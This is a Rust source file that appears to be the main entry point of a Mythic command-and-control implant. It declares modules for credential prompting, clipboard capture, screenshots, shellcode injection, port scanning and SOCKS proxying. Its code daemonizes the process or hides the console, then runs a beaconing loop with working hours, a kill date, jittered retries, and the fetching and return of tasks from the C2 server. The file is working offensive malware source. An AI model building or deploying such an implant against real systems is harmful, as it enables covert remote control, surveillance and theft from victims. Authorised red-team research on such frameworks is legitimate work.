use chrono::prelude::{DateTime, Local, NaiveDate, NaiveDateTime};
use chrono::Duration;
use std::error::Error;

// Declara todos los módulos, incluyendo socks
mod agent;
mod askcreds;
mod cat;
mod cd;
mod clipboard;
mod cp;
mod download;
mod exit;
mod getenv;
mod getprivs;
mod jobs;
mod ls;
mod mkdir;
mod mv;
mod netstat;
mod payloadvars;
mod portscan;
mod profiles;
mod ps;
mod pwd;
mod redirect;
mod rm;
mod screenshot;
mod setenv;
mod shell;
mod shinject;
mod sleep;
mod socks;  // ← AGREGA ESTA LÍNEA
mod ssh;
mod tasking;
mod unsetenv;
mod upload;
mod utils;
mod workinghours;

// Re-export commonly used types
pub use agent::Agent;
pub use agent::{AgentTask, ContinuedData, SharedData, calculate_sleep_time};

/// Real entrypoint of the program.
/// Checks to see if the agent should daemonize and then runs the main beaconing code.
pub fn real_main() -> Result<(), Box<dyn Error>> {
    if let Some(daemonize) = option_env!("daemonize") {
        if daemonize.eq_ignore_ascii_case("true") {
            // Fork the process if daemonize is set to "true"
            #[cfg(target_os = "linux")]
            if unsafe { libc::fork() } == 0 {
                run_beacon()?;
            }

            // Hide the console window for windows
            #[cfg(target_os = "windows")]
            if unsafe { winapi::um::wincon::FreeConsole() } != 0 {
                run_beacon()?;
            }
            return Ok(());
        }
    }

    run_beacon()?;

    Ok(())
}

/// Main code which runs the agent
fn run_beacon() -> Result<(), Box<dyn Error>> {
    // Create a new agent object
    let mut agent = crate::Agent::new();

    // SOCKS thread will be started automatically when SOCKS messages are received

    // Get the initial interval from the config
    let mut interval = payloadvars::callback_interval();

    // Set the number of checkin retries
    let mut tries = 1;

    // Keep trying to reconnect to the C2 if the connection is unavailable
    loop {
        // Get the current time
        let now: DateTime<Local> = std::time::SystemTime::now().into();
        let now: NaiveDateTime = now.naive_local();

        // Get the configured start working hours for beaconing
        let working_start = NaiveDateTime::new(now.date(), payloadvars::working_start());

        // Get the configured end working hours for beaconing
        let working_end = NaiveDateTime::new(now.date(), payloadvars::working_end());

        // Check the agent's working hours and don't check in if not in the configured time frame
        if now < working_start {
            let delta =
                Duration::seconds(working_start.and_utc().timestamp() - now.and_utc().timestamp());
            std::thread::sleep(delta.to_std()?);
        } else if now > working_end {
            let next_start = working_start.checked_add_signed(Duration::days(1)).unwrap();
            let delta =
                Duration::seconds(next_start.and_utc().timestamp() - now.and_utc().timestamp());
            std::thread::sleep(delta.to_std()?);
        }

        // Check if the agent has passed the kill date
        if now.date() >= NaiveDate::parse_from_str(&payloadvars::killdate(), "%Y-%m-%d")? {
            return Ok(());
        }

        // Try to make the initial checkin to the C2, if this succeeds the loop will break
        if agent.make_checkin().is_ok() {
            break;
        }

        // Check if the number of connection attempts equals the configured connection attempts
        if tries >= payloadvars::retries() {
            return Ok(());
        }

        // Calculate the sleep time and sleep the agent
        let sleeptime = calculate_sleep_time(interval, payloadvars::callback_jitter());
        std::thread::sleep(std::time::Duration::from_secs(sleeptime));

        // Increment the current attempt
        tries += 1;

        // Double the currently set interval for next connection attempt
        interval *= 2;
    } // Checkin successful

    loop {
        // Get new tasking from Mythic with retry logic
        let pending_tasks = match agent.get_tasking() {
            Ok(tasks) => tasks,
            Err(e) => {
                eprintln!("Failed to get tasking: {}. Retrying...", e);
                agent.sleep();
                continue;
            }
        };

        // Process the pending tasks
        if let Err(e) = agent.tasking.process_tasks(pending_tasks.as_ref(), &mut agent.shared) {
            eprintln!("Failed to process tasks: {}. Continuing...", e);
        }

        // Sleep the agent
        agent.sleep();

        // Get the completed task information
        let completed_tasks = match agent.tasking.get_completed_tasks() {
            Ok(tasks) => tasks,
            Err(e) => {
                eprintln!("Failed to get completed tasks: {}. Continuing...", e);
                continue;
            }
        };

        // Process SOCKS messages multiple times for better responsiveness
        for _ in 0..5 {
            if let Err(_e) = crate::socks::process_socks_messages_sync() {
                // SOCKS processing error - continue silently
            }
            // Small delay between SOCKS processing cycles
            std::thread::sleep(std::time::Duration::from_millis(10));
        }

        // Send the completed tasking information up to Mythic with retry logic
        let continued_tasking = match agent.send_tasking(&completed_tasks) {
            Ok(tasking) => tasking,
            Err(e) => {
                eprintln!("Failed to send tasking: {}. Retrying...", e);
                agent.sleep();
                continue;
            }
        };

        // Pass along any continued tasking (download, upload, etc.)
        if let Err(e) = agent.tasking.process_tasks(continued_tasking.as_ref(), &mut agent.shared) {
            eprintln!("Failed to process continued tasking: {}. Continuing...", e);
        }

        // Break out of the loop if the agent should exit
        if agent.shared.exit_agent {
            break;
        }

        // Sleep the agent
        agent.sleep();
    }

    Ok(())
}
